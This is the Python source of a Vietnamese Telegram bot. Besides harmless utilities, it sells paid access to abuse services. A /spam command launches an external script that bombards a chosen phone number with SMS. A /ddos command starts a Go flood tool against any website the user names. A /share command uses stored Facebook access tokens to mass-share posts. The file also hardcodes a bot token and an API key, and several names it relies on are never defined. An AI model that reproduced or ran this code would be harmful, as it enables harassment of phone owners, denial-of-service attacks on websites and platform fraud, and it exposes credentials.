import telebot
from gtts import gTTS
from io import BytesIO
import telebot
import qrcode
from io import BytesIO
import asyncio
import telebot
import subprocess
import os
import tempfile
import time
import time
from datetime import datetime, timedelta, date
from threading import Lock
from bs4 import BeautifulSoup
import requests 
import tempfile
import subprocess, sys
import random
import json
import os
import sqlite3
import hashlib

import zipfile
from PIL import Image, ImageOps, ImageDraw, ImageFont
from io import BytesIO
from telegram import Update, Bot, constants
from telegram.ext import Application, CommandHandler, CallbackContext


from urllib.parse import urljoin, urlparse, urldefrag
from telebot import TeleBot, types
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton




THỜI_GIAN_CHỜ = timedelta(seconds=300)
FREE_GIỚI_HẠN_CHIA_SẺ = 400
VIP_GIỚI_HẠN_CHIA_SẺ = 1000
viptime = 100
ALLOWED_GROUP_ID = -4736551267   # ID BOX
admin_diggory = "honhatthuan111" # ví dụ : để user name admin là @diggory347 bỏ dấu @ đi là đc
name_bot = "Thuandz_bot"
zalo = ""
web = "https://github.com/Dangductuyen"
facebook = "https://www.facebook.com/profile.php?id=100065957661440"
allowed_group_id = -4736551267 # ID BOX
users_keys = {}
key = ""
freeuser = []
auto_spam_active = False
last_sms_time = {}
allowed_users = []
processes = []
ADMIN_ID =  7818408538 # ID ADMIN
connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()
last_command_time = {}


user_cooldowns = {}
share_count = {}
global_lock = Lock()
admin_mode = False
BOT_LINK = 'https://t.me/Thuandz_bot'
TOKEN = '8395956317:AAHu7lAbS5Qi56EUD11bJRDi8oE-1jCpoCw'  
bot = TeleBot(TOKEN)

ADMIN_ID = 7818408538   # id admin
admins = {7818408538}
bot_admin_list = {}
cooldown_dict = {}
allowed_users = []
muted_users = {}

def get_time_vietnam():
    return datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
def check_command_cooldown(user_id, command, cooldown):
    current_time = time.time()
    
    if user_id in last_command_time and current_time - last_command_time[user_id].get(command, 0) < cooldown:
        remaining_time = int(cooldown - (current_time - last_command_time[user_id].get(command, 0)))
        return remaining_time
    else:
        last_command_time.setdefault(user_id, {})[command] = current_time
        return None

cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''') 
connection.commit()

def TimeStamp():
  now = str(date.today())
  return now


def load_users_from_database():
  cursor.execute('SELECT user_id, expiration_time FROM users')
  rows = cursor.fetchall()
  for row in rows:
    user_id = row[0]
    expiration_time = datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
    if expiration_time > datetime.now():
      allowed_users.append(user_id)


def save_user_to_database(connection, user_id, expiration_time):
  cursor = connection.cursor()
  cursor.execute(
    '''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
  connection.commit()
###



###
####
start_time = time.time()

def load_allowed_users():
    try:
        with open('admin_vip.txt', 'r') as file:
            allowed_users = [int(line.strip()) for line in file]
        return set(allowed_users)
    except FileNotFoundError:
        return set()

vip_users = load_allowed_users()

async def share_post(session, token, post_id, share_number):
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate',
        'connection': 'keep-alive',
        'content-length': '0',
        'host': 'graph.facebook.com'
    }
    try:
        url = f'https://graph.facebook.com/me/feed'
        params = {
            'link': f'https://m.facebook.com/{post_id}',
            'published': '0',
            'access_token': token
        }
        async with session.post(url, headers=headers, params=params) as response:
            res = await response.json()
            print(f"Chia sẻ bài viết thành công: {res}")
    except Exception as e:
        print(f"Lỗi khi chia sẻ bài viết: {e}")

async def get_facebook_post_id(session, post_url):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, như Gecko) Chrome/58.0.3029.110 Safari/537.3'
        }

        async with session.get(post_url, headers=headers) as response:
            response.raise_for_status()
            text = await response.text()

        soup = BeautifulSoup(text, 'html.parser')
        meta_tag = soup.find('meta', attrs={'property': 'og:url'})

        if meta_tag and 'content' in meta_tag.attrs:
            linkpost = meta_tag['content'].split('/')[-1]
            async with session.post('https://scaninfo.vn/api/fb/getID.php?url=', data={"link": linkpost}) as get_id_response:
                get_id_post = await get_id_response.json()
                if 'success' in get_id_post:
                    post_id = get_id_post["id"]
                return post_id
        else:
            raise Exception("Không tìm thấy ID bài viết trong các thẻ meta")

    except Exception as e:
        return f"Lỗi: {e}"


from telegram.ext import CommandHandler
async def fetch_video(tiktok_link):
    try:
        response = await asyncio.to_thread(requests.get, f"https://azig.dev/tiktok?video={tiktok_link}")
        if response.status_code == 200:
            data = response.json()
            if data['code'] == 0 and 'data' in data:
                video_url = data['data'].get('play')  # URL video không watermark
                if video_url:
                    video_response = await asyncio.to_thread(requests.get, video_url)
                    if video_response.status_code == 200:
                        return video_response.content
                    else:
                        return "Không thể tải video từ TikTok."
                else:
                    return "API không trả về link video."
            else:
                return "Không tìm thấy dữ liệu video."
        else:
            return f"Yêu cầu thất bại với mã lỗi {response.status_code}"
    except Exception as e:
        return f"Đã xảy ra lỗi: {e}"

# Hàm để chạy request và gửi video
def send_tiktok_video(message):
    tiktok_link = message.text.split(maxsplit=1)

    if len(tiktok_link) < 2:
        bot.reply_to(message, "Vui lòng cung cấp link TikTok. Ví dụ: /gettiktok https://www.tiktok.com/@username/video/1234567890")
        return

    tiktok_link = tiktok_link[1]

    # Chạy async trong thread riêng
    async def run_fetch():
        video_content = await fetch_video(tiktok_link)

        if isinstance(video_content, bytes):
            video_file = BytesIO(video_content)
            video_file.name = "tiktok_video.mp4"
            bot.send_video(message.chat.id, video_file)
        else:
            bot.reply_to(message, video_content)

    # Tạo thread cho async
    threading.Thread(target=lambda: asyncio.run(run_fetch())).start()
@bot.message_handler(commands=['qr'])
def generate_qr(message):
    try:
        # Lấy văn bản sau lệnh /qr
        text = message.text.replace('/qr', '').strip()
        if not text:
            bot.reply_to(message, "Vui lòng nhập văn bản sau lệnh /qr để tạo mã QR!")
            return
        
        # Tạo mã QR từ văn bản
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(text)
        qr.make(fit=True)
        
        # Lưu mã QR vào bộ nhớ tạm
        img = qr.make_image(fill_color="black", back_color="white")
        buffer = BytesIO()
        img.save(buffer, format="PNG")
        buffer.seek(0)
        
        # Gửi mã QR cho người dùng
        bot.send_photo(message.chat.id, buffer, caption=f"Mã QR cho văn bản: `{text}`", parse_mode="Markdown")
    
    except Exception as e:
        bot.reply_to(message, f"Đã xảy ra lỗi: {e}")
@bot.message_handler(content_types=["new_chat_members"])
def greet_new_member(message):
    
    for new_member in message.new_chat_members:
        # Kiểm tra nếu người dùng có username
        if new_member.username:
            name = new_member.username
        else:
            # Nếu không có username, lấy full name (first_name + last_name nếu có)
            name = f"{new_member.first_name} {new_member.last_name}" if new_member.last_name else new_member.first_name
        
        # Tạo thông điệp chào mừng
        welcome_message = f'<b><blockquote> 𝔹𝕠𝕥 𝕋𝕚𝕖̣̂𝕟 𝕀́𝕔𝕙 </blockquote>\n\n<blockquote>CHÀO MỪNG @{name} ĐÃ ĐẾN VỚI NHÓM - CHÚC BẠN CÓ MỘT NGÀY VUI VẺ VÀ MAY MẮN 💬</blockquote>\n<blockquote>DÙNG LỆNH /hdsd ĐỂ XEM DANH SÁCH LỆNH 🌟</blockquote></b>'
        
        # Gửi tin nhắn
        bot.send_message(message.chat.id, welcome_message, parse_mode='html')
# Xử lý lệnh /tinhtuoi
@bot.message_handler(commands=['tinhtuoi'])
def tinh_tuoi(message):
    try:
        username = message.from_user.username or "người dùng"
        # Lấy nội dung tin nhắn (bỏ qua lệnh)
        args = message.text.split()[1:]
        if len(args) != 3:
            bot.reply_to(message, "Vui lòng nhập ngày sinh theo định dạng: /tinhtuoi ngày tháng năm (VD: /tinhtuoi 01 01 2000)")
            return
        
        # Chuyển đổi ngày, tháng, năm
        ngay, thang, nam = map(int, args)
        ngay_sinh = datetime(nam, thang, ngay)
        hien_tai = datetime.now()

        # Tính toán thời gian
        khoang_thoi_gian = hien_tai - ngay_sinh
        tong_giay = int(khoang_thoi_gian.total_seconds())
        tong_phut = tong_giay // 60
        tong_gio = tong_phut // 60
        tong_ngay = khoang_thoi_gian.days
        tong_tuan = tong_ngay // 7
        tong_thang = (hien_tai.year - ngay_sinh.year) * 12 + (hien_tai.month - ngay_sinh.month)
        tong_nam = hien_tai.year - ngay_sinh.year - ((hien_tai.month, hien_tai.day) < (ngay_sinh.month, ngay_sinh.day))

        # Gửi kết quả cho người dùng
        bot.reply_to(
            message,
            f"Tuổi của @{username} tính từ {ngay_sinh.strftime('%d/%m/%Y')}:\n"
            f"◈ Số giây: {tong_giay:,}\n"
            f"◈ Số phút: {tong_phut:,}\n"
            f"◈ Số giờ: {tong_gio:,}\n"
            f"◈ Số ngày: {tong_ngay:,}\n"
            f"◈ Số tuần: {tong_tuan:,}\n"
            f"◈ Số tháng: {tong_thang:,}\n"
            f"◈ Số năm: {tong_nam:,}"
        )
    except ValueError:
        bot.reply_to(message, "Vui lòng nhập ngày-tháng-năm hợp lệ! (VD: /tinhtuoi 01 01 2000)")

# Thêm handler cho lệnh /gettiktok
@bot.message_handler(commands=['gettiktok'])
def handle_gettiktok(message):
    send_tiktok_video(message)

@bot.message_handler(commands=['getuid'])
def send_uid(message):
    try:
        fb_link = message.text.split(maxsplit=1)
        
        if len(fb_link) < 2:
            bot.reply_to(message, "Vui lòng cung cấp link Facebook. Ví dụ: /getuid https://facebook.com/username")
            return
        
        fb_link = fb_link[1]
        
        # Gửi yêu cầu đến API để lấy UID từ link Facebook, đặt thời gian chờ là 5 giây
        response = requests.get(f"https://azig.dev/facebook/uid?link={fb_link}", timeout=5)
        
        if response.status_code == 200:
            # Giả sử API trả về JSON chứa UID trực tiếp
            uid = response.json().get('uid', 'Không tìm thấy UID')
            bot.reply_to(message, f"UID của link Facebook là: {uid}")
        else:
            bot.reply_to(message, f"Yêu cầu thất bại với mã lỗi {response.status_code}")
    except requests.exceptions.Timeout:
        bot.reply_to(message, "Yêu cầu đã hết thời gian chờ, vui lòng thử lại.")
    except Exception as e:
        bot.reply_to(message, f"Đã xảy ra lỗi: {e}")

@bot.message_handler(commands=['time'])
def handle_time(message):
    uptime_seconds = int(time.time() - start_time)
    
    uptime_minutes, uptime_seconds = divmod(uptime_seconds, 60)
    bot.reply_to(message, f'[❄️]~~~>TIME<~~~[❄️]\nBot đã hoạt động được\n{uptime_minutes} phút, {uptime_seconds} giây')
#tiktok
def fetch_tiktok_data(url):
    api_url = f'https://scaninfo.vn/api/down/tiktok.php?url={url}'
    try:
        response = requests.get(api_url)
        response.raise_for_status()  
        data = response.json()
        return data
    except requests.exceptions.RequestException as e:
        print(f"Error fetching TikTok data: {e}")
        return None

@bot.message_handler(commands=['thoitiet'])
def thoitiet(message):
    query = 'Hà Nội'
    api_url = f'https://nguyenmanh.name.vn/api/thoitiet?type=text&query={query}&apikey=OUEaxPOl'
    response = requests.get(api_url)
    
    try:
        data = response.json()
        if data['status'] == 200:
            weather_result = data['result']['result']
            bot.reply_to(message, f'<blockquote>{weather_result}</blockquote>', parse_mode='HTML')
        else:
            bot.reply_to(message, 'Lỗi khi lấy thông tin thời tiết.')
    except requests.exceptions.JSONDecodeError:
        bot.reply_to(message, 'Lỗi phân tích dữ liệu từ API.')

@bot.message_handler(commands=['tiktok'])
def tiktok_command(message):
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) == 2:
        url = command_parts[1].strip()
        data = fetch_tiktok_data(url)
        
        if data and 'code' in data and data['code'] == 0:
            video_title = data['data'].get('title', 'N/A')
            video_url = data['data'].get('play', 'N/A')
            music_title = data['data']['music_info'].get('title', 'N/A')
            music_url = data['data']['music_info'].get('play', 'N/A')
            
            reply_message = f"Tiêu đề Video: {video_title}\nĐường dẫn Video: {video_url}\n\nTiêu đề Nhạc: {music_title}\nĐường dẫn Nhạc: {music_url}"
            bot.reply_to(message, reply_message)
        else:
            bot.reply_to(message, "Không thể lấy dữ liệu từ TikTok.")
    else:
        bot.reply_to(message, "Hãy cung cấp một đường dẫn TikTok hợp lệ.")


@bot.message_handler(commands=['tool'])
def send_tool_links(message):
    markup = types.InlineKeyboardMarkup()
    
    tool_links = [
        ("https://github.com/Dangductuyen/All_tool", "Tool Gộp - Source"),
        ("https://github.com/Dangductuyen/Dangductuyen", "Tool Ddos - demo")
    ]
    
    for link, desc in tool_links:
        markup.add(types.InlineKeyboardButton(text=desc, url=link))
    
    bot.reply_to(message, "Chọn một tool từ bên dưới:", reply_markup=markup)
####
#####
video_url = 'https://v16m-default.akamaized.net/b7650db4ac7f717b7be6bd6a04777a0d/66a418a5/video/tos/useast2a/tos-useast2a-ve-0068-euttp/o4QTIgGIrNbkAPGKKLKteXyLedLE7IEgeSzeE2/?a=0&bti=OTg7QGo5QHM6OjZALTAzYCMvcCMxNDNg&ch=0&cr=0&dr=0&lr=all&cd=0%7C0%7C0%7C0&cv=1&br=2576&bt=1288&cs=0&ds=6&ft=XE5bCqT0majPD12cy-773wUOx5EcMeF~O5&mime_type=video_mp4&qs=0&rc=Mzk1OzY7PGdpZjxkOTQ3M0Bpajh1O2w5cmlzbzMzZjgzM0AuNWJgLi02NjMxLzBgXjUyYSNzNmptMmRjazFgLS1kL2Nzcw%3D%3D&vvpl=1&l=202407261543513F37EAD38E23B6263167&btag=e00088000'
@bot.message_handler(commands=['add', 'adduser'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, 'BẠN KHÔNG CÓ QUYỀN SỬ DỤNG LỆNH NÀY')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'VUI LÒNG NHẬP ID NGƯỜI DÙNG')
        return

    user_id = int(message.text.split()[1])
    allowed_users.append(user_id)
    expiration_time = datetime.now() + timedelta(days=30)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()

    # Gửi video với tiêu đề
    caption_text = (f'NGƯỜI DÙNG CÓ ID {user_id}                                ĐÃ ĐƯỢC THÊM VÀO DANH SÁCH ĐƯỢC PHÉP SỬ DỤNG LỆNH /spamvip')
    bot.send_video(
        message.chat.id,
        video_url,
        caption=caption_text
    )

load_users_from_database()

def is_key_approved(chat_id, key):
    if chat_id in users_keys:
        user_key, timestamp = users_keys[chat_id]
        if user_key == key:
            current_time = datetime.datetime.now()
            if current_time - timestamp <= datetime.timedelta(hours=2):
                return True
            else:
                del users_keys[chat_id]
    return False

@bot.message_handler(commands=['share'])
def share(message):
    global bot_active, global_lock, admin_mode
    chat_id = message.chat.id
    user_id = message.from_user.id
    current_time = datetime.now()


    if not bot_active:
        msg = bot.reply_to(message, 'Bot hiện đang tắt.')
        time.sleep(10)
        try:
            bot.delete_message(chat_id=message.chat.id, message_id=msg.message_id)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error deleting message: {e}")
        return

    if chat_id != ALLOWED_GROUP_ID:
        msg = bot.reply_to(message, 'Làm Trò Gì Khó Coi Vậy')
        time.sleep(10)
        try:
            bot.delete_message(chat_id=message.chat.id, message_id=msg.message_id)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error deleting message: {e}")
        return
    
    if admin_mode and user_id not in admins:
        msg = bot.reply_to(message, 'Chế độ admin hiện đang bật, đợi tí đi.')
        time.sleep(10)
        try:
            bot.delete_message(chat_id=message.chat.id, message_id=msg.message_id)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error deleting message: {e}")
        return
    
    try:
        global_lock.acquire()  
        
        args = message.text.split()
        if user_id not in allowed_users and user_id not in freeuser:
            bot.reply_to(message, 'bot chỉ hoạt động khi bạn mua key và get key bằng lệnh /laykey')
            return
        if len(args) != 3:
            msg = bot.reply_to(message, '''
╔══════════════════
║<|> /laykey trước khi sài hoặc mua
║<|> /key <key> để nhập key 
║<|> ví dụ /key ABCDXYZ
║<|> /share {link_buff} {số lần chia sẻ}
╚══════════════════''')
            time.sleep(10)
            try:
                bot.delete_message(chat_id=message.chat.id, message_id=msg.message_id)
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error deleting message: {e}")
            return

        post_id, total_shares = args[1], int(args[2])

        # Kiểm tra người dùng VIP hoặc Free
        if user_id in allowed_users:
            handle_vip_user(message, user_id, post_id, total_shares, current_time)
        elif user_id in freeuser:
            handle_free_user(message, user_id, post_id, total_shares, current_time)
            
    except Exception as e:
        msg = bot.reply_to(message, f'Lỗi: {e}')
        time.sleep(10)
        try:
            bot.delete_message(chat_id=message.chat.id, message_id=msg.message_id)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error deleting message: {e}")

    finally:
        if global_lock.locked():
            global_lock.release()  

def handle_vip_user(message, user_id, post_id, total_shares, current_time):
    if user_id in user_cooldowns:
        last_share_time = user_cooldowns[user_id]
        if current_time < last_share_time + timedelta(seconds=viptime):
            remaining_time = (last_share_time + timedelta(seconds=viptime) - current_time).seconds
            msg = bot.reply_to(message, f'Bạn cần đợi {remaining_time} giây trước khi chia sẻ lần tiếp theo.\nvip Delay')
            time.sleep(10)
            bot.delete_message(chat_id=message.chat.id, message_id=msg.message_id)
            return
    if total_shares > VIP_GIỚI_HẠN_CHIA_SẺ:
        msg = bot.reply_to(message, f'Số lần chia sẻ vượt quá giới hạn {VIP_GIỚI_HẠN_CHIA_SẺ} lần.')
        time.sleep(10)
        bot.delete_message(chat_id=message.chat.id, message_id=msg.message_id)
        return
     #phân file token khác nhau
    file_path = 'token.txt'
    with open(file_path, 'r') as file:
        tokens = file.read().split('\n')

    total_live = len(tokens)

    sent_msg = bot.reply_to(message,
        f'Bot Chia Sẻ Bài Viết\n\n'
        f'║Số Lần Chia Sẻ: {total_shares}\n'
        f'║Free Max 400 Share\n'
        f'║{message.from_user.username} Đang Dùng Vip',
        parse_mode='HTML'
    )

    bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
#check live token
    if total_live == 0:
        bot.edit_message_text(chat_id=message.chat.id, message_id=sent_msg.message_id, text='Không có token nào hoạt động.')
        return

    share_log.append({
        'username': message.from_user.username,
        'user_id': user_id,
        'time': current_time.strftime('%Y-%m-%d %H:%M:%S'),
        'post_id': post_id,
        'total_shares': total_shares
    })

    async def share_with_delay(session, token, post_id, count):
        await share_post(session, token, post_id, count)
        await asyncio.sleep(1)

    async def main():
        async with aiohttp.ClientSession() as session:
            tasks = []
            for i in range(total_shares):
                token = random.choice(tokens)
                share_number = share_count.get(user_id, 0) + 1
                share_count[user_id] = share_number
                tasks.append(share_with_delay(session, token, post_id, share_number))
            await asyncio.gather(*tasks)

    asyncio.run(main())

    bot.edit_message_text(chat_id=message.chat.id, message_id=sent_msg.message_id, text='Đơn của bạn đã hoàn thành')

def handle_free_user(message, user_id, post_id, total_shares, current_time):
    if user_id in user_cooldowns:
        last_share_time = user_cooldowns[user_id]
        if current_time < last_share_time + THỜI_GIAN_CHỜ:
            remaining_time = (last_share_time + THỜI_GIAN_CHỜ - current_time).seconds
            msg = bot.reply_to(message, f'Bạn cần đợi {remaining_time} giây trước khi chia sẻ lần tiếp theo.')
            time.sleep(10)
            bot.delete_message(chat_id=message.chat.id, message_id=msg.message_id)
            return

    if total_shares > FREE_GIỚI_HẠN_CHIA_SẺ:
        msg = bot.reply_to(message, f'Số lần chia sẻ vượt quá giới hạn {FREE_GIỚI_HẠN_CHIA_SẺ} lần.')
        time.sleep(10)
        bot.delete_message(chat_id=message.chat.id, message_id=msg.message_id)
        return
    #token free
    file_path = 'token.txt'
    with open(file_path, 'r') as file:
        tokens = file.read().split('\n')

    total_live = len(tokens)

    sent_msg = bot.reply_to(message,
        f'Bot Chia Sẻ Bài Viết\n\n'
        f'║Số lần share: {total_shares}\n'
        f'║Vip Max 1000 Share\n'
        f'║{message.from_user.username} Đang Share Free',
        parse_mode='HTML'
    )

    bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)

    if total_live == 0:
        bot.edit_message_text(chat_id=message.chat.id, message_id=sent_msg.message_id, text='Không có token nào hoạt động.')
        return

    share_log.append({
        'username': message.from_user.username,
        'user_id': user_id,
        'time': current_time.strftime('%Y-%m-%d %H:%M:%S'),
        'post_id': post_id,
        'total_shares': total_shares
    })

    async def share_with_delay(session, token, post_id, count):
        await share_post(session, token, post_id, count)
        await asyncio.sleep(1)

    async def main():
        async with aiohttp.ClientSession() as session:
            tasks = []
            for i in range(total_shares):
                token = random.choice(tokens)
                share_number = share_count.get(user_id, 0) + 1
                share_count[user_id] = share_number
                tasks.append(share_with_delay(session, token, post_id, share_number))
            await asyncio.gather(*tasks)

    asyncio.run(main())

    user_cooldowns[user_id] = current_time

    bot.edit_message_text(chat_id=message.chat.id, message_id=sent_msg.message_id, text='Đơn của bạn đã hoàn thành')
@bot.message_handler(commands=['vip'])
def handle_vip(message):
    chat_id = message.chat.id
    if message.from_user.id not in vip_users:
        bot.reply_to(message, "Bạn không phải là thành viên VIP.")
        return

   


@bot.message_handler(commands=['ls'])
def sharelog(message):
    if message.from_user.id in admins:
        if not share_log:
            bot.reply_to(message, 'chưa ai sử dụng hết')
            return
        
        log_text = "Danh sách người đã sử dụng lệnh share:\n"
        for log in share_log:
            log_text += f"<blockquote>Lịch_Sử\n- User: {log['username']} (ID: {log['user_id']})\n- vào lúc {log['time']}\n- Post LINK: <a href='{log['post_id']}'>link</a>\n- Số lần chia sẻ: {log['total_shares']}\n</blockquote>"
        
        bot.reply_to(message, log_text, parse_mode='HTML')
    else:
        bot.reply_to(message, 'admin mới xem đc á m')
@bot.message_handler(commands=['admod'])
def handle_on(message):
    global admin_mode
    if message.from_user.id in admins:
        admin_mode = True
        bot.reply_to(message, "Chế độ admin đã bật.")
    else:
        bot.reply_to(message, "Bạn không có quyền bật chế độ admin.")


@bot.message_handler(commands=['unadmod'])
def handle_off(message):
    global admin_mode
    if message.from_user.id in admins:
        admin_mode = False
        bot.reply_to(message, "Chế độ admin đã tắt.")
    else:
        bot.reply_to(message, "Bạn không có quyền tắt chế độ admin.")
@bot.message_handler(commands=['off'])
def bot_off(message):
    global bot_active
    if message.from_user.id in admins:
        bot_active = False
        bot.reply_to(message, 'Bot đã được tắt.')
    else:
        bot.reply_to(message, 'Bạn không có quyền thực hiện thao tác này.')
@bot.message_handler(commands=['on'])
def bot_on(message):
    global bot_active
    if message.from_user.id in admins:
        bot_active = True
        bot.reply_to(message, 'Bot đã được bật.')
    else:
        bot.reply_to(message, 'Bạn không có quyền thực hiện thao tác này.')
@bot.message_handler(commands=['code'])
def handle_code_command(message):
    # Tách lệnh và URL từ tin nhắn
    command_args = message.text.split(maxsplit=1)

    # Kiểm tra xem URL có được cung cấp không
    if len(command_args) < 2:
        bot.reply_to(message, "Vui lòng cung cấp url sau lệnh /code. Ví dụ: /code https://db.com")
        return

    url = command_args[1]
    domain = urlparse(url).netloc
    file_name = f"{domain}.txt"
    
    try:
        # Lấy nội dung HTML từ URL
        response = requests.get(url)
        response.raise_for_status()  # Xảy ra lỗi nếu có lỗi HTTP

        # Lưu nội dung HTML vào file
        with open(file_name, 'w', encoding='utf-8') as file:
            file.write(response.text)

        # Gửi file về người dùng
        with open(file_name, 'rb') as file:
            bot.send_document(message.chat.id, file, caption=f"HTML của trang web {url}")

        # Phản hồi tin nhắn gốc
        bot.reply_to(message, "Đã gửi mã nguồn HTML của trang web cho bạn.")

    except requests.RequestException as e:
        bot.reply_to(message, f"Đã xảy ra lỗi khi tải trang web: {e}")

    finally:
        # Đảm bảo xóa file sau khi gửi
        if os.path.exists(file_name):
            try:
                os.remove(file_name)
            except Exception as e:
                bot.reply_to(message, f"Đã xảy ra lỗi khi xóa file: {e}")
@bot.message_handler(commands=['hdsd'])
def send_welcome(message):
   
   
    username = message.from_user.username

    bot.reply_to(message, f'''
╭─────《 𝕄𝔼ℕ𝕌 》──────۰۪۪۫۫●۪۫۰
│◈ xin chào {username}
│◈/hdsd: menu bot
├───《 LỆNH DDOS NEW UPDATE 》───⭔
│Bảo trì
├───《 LỆNH SPAM SMS 》───⭔
│◈/spam: Spam sms thường <không cần lấy key>
│◈/spamvip: Spam sms vip chỉ dành cho người dùng đã mua key vip từ admin 
├───《 THÔNG TIN MUA VIP VÀ ADMIN 》───⭔
│◈/muavip: Giá vip và nơi mua vip
│◈/admin: thông tin của admin 
├───《 CÁC LỆNH TIỆN ÍCH 》───⭔
│◈/voice: chuyển văn bản thành giọng nói
│◈/qr: tạo mã QR theo văn bản
│◈/thoitiet: check thời tiết
│◈/tinhtuoi: tính tuổi của bạn /tinhtuoi <ngày> <tháng> <năm>
│◈/add: Thêm người dùng sử dụng /spamvip
│◈/tv: Đổi Ngôn Ngữ Sang Tiếng Việt
│◈/ad: check có bao nhiêu admin
│◈/tool: tải tool lõ của 
│◈/id: lấy id của bản thân 
│◈/code: lấy index.html
│◈/time: check time bot
├───《 LỆNH DÀNH CHO ADMIN 》───⭔
│◈/reload: reset bot
│◈/on: on bot
│◈/add: Thêm người dùng sử dụng /spamvip
│◈/off: off bot
│◈ https://files.catbox.moe/lmtq19.mp4
╰─────────────⭓
    ''')


@bot.message_handler(commands=['admin'])
def diggory(message):
     
    username = message.from_user.username
    diggory_chat = f'''
┌───➤ {name_bot}
┣➤ Xin chào @{username} thân mến
┣➤ Admin Bot : Hồ Nhật Thuận (REAL 👑)
┣➤ country : VietNam,YenBai,YenBinh
┣➤ date of birth : 30-4-1975
┣➤ gender : male
┣➤ Zalo: {zalo}
┣➤ Website: {web}
┣➤ Telegram: @{honhatthuan111}
┣➤ https://files.catbox.moe/5l74tr.mp4
└──────────────➤
    '''
    bot.send_animation(chat_id=message.chat.id, animation="https://files.catbox.moe/5l74tr.mp4")

    bot.send_message(message.chat.id, diggory_chat)


last_usage = {}
@bot.message_handler(commands=['muavip'])
def handle_muavip(message):
    response = (
        "💎 Thông tin mua VIP:\n"
        "- Phí: 20,000 VND/tháng\n"
        "- Nhận CARD và Chuyển Khoản.\n"
        "- Liên hệ admin : @honhatthuan111 để mua vip.\n"
    )
    bot.reply_to(message, response)

@bot.message_handler(commands=['spam'])
def spam(message):
    user_id = message.from_user.id
    username = message.from_user.username or f"ID: {user_id}"
    current_time = time.time()
    if not bot_active:
        msg = bot.reply_to(message, 'Bot hiện đang tắt.')
        time.sleep(10)
        try:
            bot.delete_message(chat_id=message.chat.id, message_id=msg.message_id)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error deleting message: {e}")
        return
    if admin_mode and user_id not in admins:
        msg = bot.reply_to(message, 'có lẽ admin đang fix gì đó hãy đợi xíu')
#    if user_id in last_usage and current_time - last_usage[user_id] < 100:
 #       bot.reply_to(message, f"Vui lòng đợi {100 - (current_time - last_usage[user_id]):.1f} giây trước khi sử dụng lệnh lại.")
        return

    last_usage[user_id] = current_time

    # Phân tích cú pháp lệnh
    params = message.text.split()[1:]
    if len(params) != 2:
        bot.reply_to(message, "vui lòng điền theo lệnh /spam <sdt> <số lần spam>")
        return

    sdt, count = params

    if not count.isdigit():
        bot.reply_to(message, "Số lần spam không hợp lệ. Vui lòng chỉ nhập số.")
        return

    count = int(count)

    if count > 5:
        bot.reply_to(message, "/spam tối đa spam  là 5 - vui lòng sử dụng lại.")
        return

    if sdt in blacklist:
        bot.reply_to(message, f"Số điện thoại {sdt} đã bị cấm spam.")
        return

    diggory_chat3 = f'''
┏━━━━━━━━━━━━━━━━┓\n┣➤ 🚀 Gửi Yêu Cầu Tấn Công Thành Công 🚀 \n┣➤ Attack By : {username}\n┣➤ Số Tấn Công 📱:[ {sdt} ]\n┣➤ số lần spam: {count} \n┣➤Bạn Đang Sử Dụng Spam Thường\n┣➤https://files.catbox.moe/dlb0lp.mp4
'''
    script_filename = "s1.py"  # Tên file Python trong cùng thư mục
    try:
        # Kiểm tra xem file có tồn tại không
        if not os.path.isfile(script_filename):
            bot.reply_to(message, "Không tìm thấy file script. Vui lòng kiểm tra lại.")
            return

        # Đọc nội dung file với mã hóa utf-8
        with open(script_filename, 'r', encoding='utf-8') as file:
            script_content = file.read()

        # Tạo file tạm thời
        with tempfile.NamedTemporaryFile(delete=False, suffix=".py") as temp_file:
            temp_file.write(script_content.encode('utf-8'))
            temp_file_path = temp_file.name

        # Chạy file tạm thời
        process = subprocess.Popen(["python", temp_file_path, sdt, str(count)])
        bot.send_message(message.chat.id, diggory_chat3)
    except FileNotFoundError:
        bot.reply_to(message, "Không tìm thấy file.")
    except Exception as e:
        bot.reply_to(message, f"Lỗi xảy ra: {str(e)}")



blacklist = ["112", "113", "114", "115", "116", "117", "118", "119", "0328396499", "1", "2", "3", "4"]
import subprocess

import urllib.parse

import urllib.parse

@bot.message_handler(commands=['ddos'])
def flood_command(message):
    try:
        args = message.text.split()[1:]
        if len(args) != 2:
            bot.reply_to(message, "Vui lòng nhập đúng lệnh: /ddos <url> <time>")
            return

        site, duration = args
        duration = int(duration)

        # Giới hạn thời gian tấn công là 100 giây
        if duration > 500:
            duration = 100
            bot.reply_to(message, "❗ Thời gian tấn công đã được giới hạn ở 500 giây.")

        # Tạo liên kết kiểm tra website trên checkhost.net
        encoded_url = urllib.parse.quote(site)
        check_host_link = f"https://check-host.net/check-http?host={encoded_url}"

        command = ["go", "run", "flood.go", "-site", site, "-time", str(duration)]
        subprocess.Popen(command)

        # Gửi phản hồi kèm video
        bot.reply_to(message, f'''
┌───➤ {name_bot}
┣➤ Attack Website
┣➤ Vui lòng chờ vài giây để bot khởi chạy lệnh
┣➤ Website: {site}
┣➤ Time: {duration}
┣➤ Kiểm tra trạng thái: [Check Host]({check_host_link})
└──────────────➤''', parse_mode="Markdown")
        
